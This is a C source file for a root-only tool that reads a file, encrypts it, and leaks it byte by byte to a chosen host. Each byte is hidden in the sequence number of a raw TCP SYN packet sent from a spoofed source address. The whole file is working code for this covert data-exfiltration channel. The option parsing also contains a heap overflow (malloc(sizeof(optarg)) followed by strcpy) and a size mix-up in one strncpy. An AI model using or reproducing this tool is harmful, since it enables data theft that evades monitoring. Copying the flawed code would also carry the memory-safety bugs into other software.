#include "../include/packet.h"

void raw_packet_init(void) {

    /* this code experiments with making raw structs by using
     * the struct raw_pack (a combination of tcphdr and iphdr) and
     * using pointers which is faster compared to using plain structs
     * and moving them around - this technique is also
     * used in the syn scanner Creeper (by ithilgore)
     * the only new idea is using the combination of the 2 headers
     * into a struct called raw_pack which makes the code more readable
     */

    /* The logic is simple: we create a buffer datagram into which the
     * tcp and ip headers will be stored. We take into account the additional
     * storage needed by the pseudo header used for the tcp checksumming
     * process. The raw_pack pointer points to the beginning of the datagram and
     * the pseudo_header will point to the end of the raw_pack (still inside the
     * buffer datagram). The sendto() function will send only the portion of the
     * datagram which contains the raw_pack (tcp and ip headers ) - the
     * pseudo_header never reaches the wire
     */

    char datagram[sizeof(raw_pack) +
                  sizeof(pseudo_hdr)]; /* buffer for the headers */
    raw_pack *raw =
        (struct raw_pack *)datagram; /* point the raw_pack to the datagram */
    pseudo_hdr *phdr;                /* pseudo header pointer */
    FILE *input;                     /* file pointer */
    int ch;                          /* buffer storing input from file */
    char *buffer;
    int sockfd; /* raw socket descriptor */
    unsigned int dst,
        src; /* integers used for filling in the addresses with inet_pton() */
    struct sockaddr_in sin; /* struct used for the raw socket info */

    if ((input = fopen(o.file, "rb")) == NULL) {
        fprintf(stderr, "file %s cannot be opened for reading\n", o.file);
        exit(EXIT_FAILURE);
    }

    int len = encrypt_file(input);

    memset(datagram, 0, sizeof(datagram)); /* bzero the datagram */

    /* convert strings to network ints */
    if (inet_pton(AF_INET, o.dst, (unsigned int *)&dst) < 0)
        clean_exit("invalid source addr", 0);
    if (inet_pton(AF_INET, o.src, (unsigned int *)&src) < 0)
        clean_exit("invalid dest addr", 0);

    /* main raw packet building loop */
    // while ((ch = fgetc(input)) != EOF) {
    for (int i = 0; i < len; i++) {
        ch = encrypted[i];

        sleep(1); // TODO: optimal time needed here
        /* raw packet creation */
        /* ip header construction */
        /* all the values that are over 1 octer need to be network byte ordered
         */
        raw->ip.ihl = 5;
        raw->ip.version = 4;
        raw->ip.tos = 0;
        raw->ip.tot_len = htons(40);    /* 16 byte value */
        raw->ip.frag_off = 0;           /* no fragment */
        raw->ip.ttl = 64;               /* default value */
        raw->ip.protocol = IPPROTO_TCP; /* protocol at L4 */
        raw->ip.check = 0;              /* ??not needed in iphdr */
        raw->ip.saddr = (src);
        raw->ip.daddr = (dst);

        /* tcp header construction */
        raw->tcp.source = htons(1 + (int)(10000.0 * rand() / (RAND_MAX + 1.0)));
        raw->tcp.dest = htons(o.port);
        raw->tcp.seq = ch; /* we encode the data in the seq */
        raw->tcp.ack_seq = 0;
        raw->tcp.res1 = 0; /* reserved bits */
        raw->tcp.doff = 5; /* header length (counted in 32 bit words) */
        raw->tcp.fin = 0;
        raw->tcp.syn = 1;
        raw->tcp.rst = 0;
        raw->tcp.psh = 0;
        raw->tcp.ack = 0;
        raw->tcp.urg = 0;
        raw->tcp.window = htons(512);
        raw->tcp.check = 0;
        raw->tcp.urg_ptr = 0;

        /* fill the socket struct */
        sin.sin_family = AF_INET;
        sin.sin_port = raw->tcp.source;
        sin.sin_addr.s_addr = raw->ip.daddr;

        /* make a raw socket */
        if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
            clean_exit("cannot open socket", 1);

        /* ip header checksum */
        raw->ip.check = htons(checksum_comp((unsigned short *)&(raw->ip), 20));
        // TODO: some hosts respond with incorrect checksum ???

        /* pseudo header used for checksumming */
        phdr = (struct pseudo_hdr *)(datagram + sizeof(raw_pack));

        phdr->src = raw->ip.saddr;
        phdr->dst = raw->ip.daddr;
        phdr->mbz = 0;
        phdr->proto = IPPROTO_TCP;
        phdr->len = ntohs(0x14);

        /* tcp checksum */
        raw->tcp.check =
            htons(checksum_comp((unsigned short *)&(raw->tcp),
                                sizeof(raw->tcp) + sizeof(pseudo_hdr)));
        /* do u like the above indendentation ?? either way, i don't care */
        /* send the raw packet */
        int err = sendto(sockfd, datagram, sizeof(raw_pack), 0,
                         (struct sockaddr *)&sin, sizeof(sin));
        if (err < 0)
            clean_exit("sendto error: ", 1);
#ifdef DEBUG
        if (o.debug)
            fprintf(stderr, "bytes send by sendto(): %d \n", err);
#endif

        fprintf(stdout, "Sending Data: %c\n", ch);
        close(sockfd);
    }
    fclose(input);
}

/****************** MAIN PROGRAM **************************/
int main(int argc, char **argv) {

    if (argc == 1) {
        print_usage(1);
        exit(EXIT_SUCCESS);
    }

    /* option parsing */
    int opt;
    while ((opt = getopt(argc, argv, "d:s:p:f:vhD")) != -1) {
        switch (opt) {
        case 'd': /* destination address */
            strncpy(o.dst, optarg, sizeof(o.dst));
            // if the address is less than 15 chars strncpy pads the dest with
            // nulls
            o.opt_ex |= (1 << 0);
            break;
        case 's': /* source address */
            strncpy(o.src, optarg, sizeof(o.dst));
            o.opt_ex |= (1 << 1);
            break;
        case 'p': /* destination port */
            o.port = atoi(optarg);
            o.opt_ex |= (1 << 2);
            break;
        case 'f': /* input file */
            o.file = (char *)malloc(sizeof(optarg));
            strcpy(o.file, optarg);
            o.opt_ex |= (1 << 3);
            break;
        case 'v': /* verbose mode */
            o.verbose = TRUE;
            break;
        case 'h': /* help - usage */
            print_usage(1);
            break;
#ifdef DEBUG
        case 'D': /* debug mode */
            o.debug = TRUE;
            break;
#endif
        case '?': /* error */
            fprintf(stderr,
                    "option inconsistency : -%c \n"
                    "see usage(no arguments)\n",
                    optopt);
            exit(EXIT_FAILURE);
        }
    }
    /* some option restrictions */
    if ((o.opt_ex & 0x0F) != 0x0F)
        clean_exit("need to provide all -d -s -p -f arguments", 0);

    /* check if u r r00t */
    if (getuid() && geteuid())
        clean_exit("need to be root", 0);

    /* create the raw packet and send it */
    raw_packet_init();

    return (EXIT_SUCCESS);
}